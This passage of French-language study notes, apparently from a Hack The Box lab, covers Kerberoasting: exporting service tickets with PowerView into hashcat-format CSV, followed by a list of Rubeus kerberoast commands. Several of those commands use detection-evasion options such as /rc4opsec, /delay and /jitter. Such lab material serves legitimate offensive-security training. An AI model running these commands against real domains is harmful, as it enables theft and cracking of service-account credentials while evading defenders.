   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
====================
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
====================
```

---

## Préparation pour le Craquage

Prenez le blob Base64 extrait et supprimez les sauts de ligne et les espaces blancs, car la sortie est en colonne et doit être sur une seule ligne.


## Exportation des tickets vers un fichier CSV

### Commande PowerShell
Pour extraire les tickets et les exporter dans un fichier `.csv` :
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### Visualisation du fichier `.csv`
Pour visualiser le contenu du fichier exporté :
```powershell
cat .\ilfreight_tgs.csv
```

### Exemple de sortie
```plaintext
"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"adfs","CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$..."
```

---

## Utilisation de Rubeus

### Introduction à Rubeus
Rubeus est un outil de la suite GhostPack permettant de manipuler Kerberos de manière avancée, incluant Kerberoasting. Voici quelques commandes clés.

### Afficher l'aide de Rubeus
Pour lister toutes les options disponibles :
```powershell
.\Rubeus.exe
```

### Exemples de commandes pour Kerberoasting
1. **Extraction de base des tickets :**
   ```powershell
   Rubeus.exe kerberoast /outfile:hashes.txt
   ```

2. **Utilisation de SPN spécifiques :**
   ```powershell
   Rubeus.exe kerberoast /spn:"service/nom"
   ```

3. **Utilisation de SPN depuis un fichier :**
   ```powershell
   Rubeus.exe kerberoast /spns:C:\temp\spns.txt
   ```

4. **Extraction avec des identifiants alternatifs :**
   ```powershell
   Rubeus.exe kerberoast /creduser:DOMAIN\USER /credpassword:PASSWORD
   ```

5. **Kerberoasting avec un TGT existant :**
   ```powershell
   Rubeus.exe kerberoast /ticket:BASE64
   ```

6. **Extraction des comptes avec des mots de passe définis dans une période spécifique :**
   ```powershell
   Rubeus.exe kerberoast /pwdsetafter:01-01-2020 /pwdsetbefore:01-01-2022
   ```

7. **Opsec Kerberoasting (filtrage des comptes AES) :**
   ```powershell
   Rubeus.exe kerberoast /rc4opsec
   ```

---

## Options supplémentaires
- **Statistiques sur les comptes Kerberoastables :**
  ```powershell
  Rubeus.exe kerberoast /stats
  ```

- **Limitation du nombre de tickets extraits :**
  ```powershell
  Rubeus.exe kerberoast /resultlimit:5
  ```

- **Ajout de délais et de jitter pour éviter la détection :**
  ```powershell
  Rubeus.exe kerberoast /delay:5000 /jitter:30
  ```

---

## Conclusion
Rubeus offre une flexibilité remarquable pour effectuer des attaques Kerberoasting, avec de nombreuses options adaptées à divers scénarios. Familiarisez-vous avec ses fonctionnalités pour maximiser son efficacité tout en minimisant les risques de détection.

